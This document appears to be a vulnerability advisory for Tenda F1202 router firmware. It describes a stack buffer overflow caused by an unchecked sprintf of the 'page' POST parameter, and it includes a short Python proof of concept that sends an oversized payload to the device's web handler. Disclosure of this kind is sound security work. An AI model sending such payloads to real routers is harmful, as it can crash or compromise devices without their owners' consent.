## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2671.html

## Affected version

F1202 V1.2.0.20(408)

## Vulnerability details

The Tenda F1202 V1.2.0.20(408) firmware has a stack overflow vulnerability located in the `fromwebExcptypemanFilter` function. This function accepts the `page` parameter from a POST request. The statement `sprintf(v8, "firewall_murlexcplist.asp?page=%s", v3);` leads to a buffer overflow. The user-supplied `page` can exceed the capacity of the `v8` array, thus triggering this security vulnerability.

![image-20240409100908565](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409100908565.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/webExcptypemanFilter"
payload = b"a"*1000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409100557300](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409100557300.png)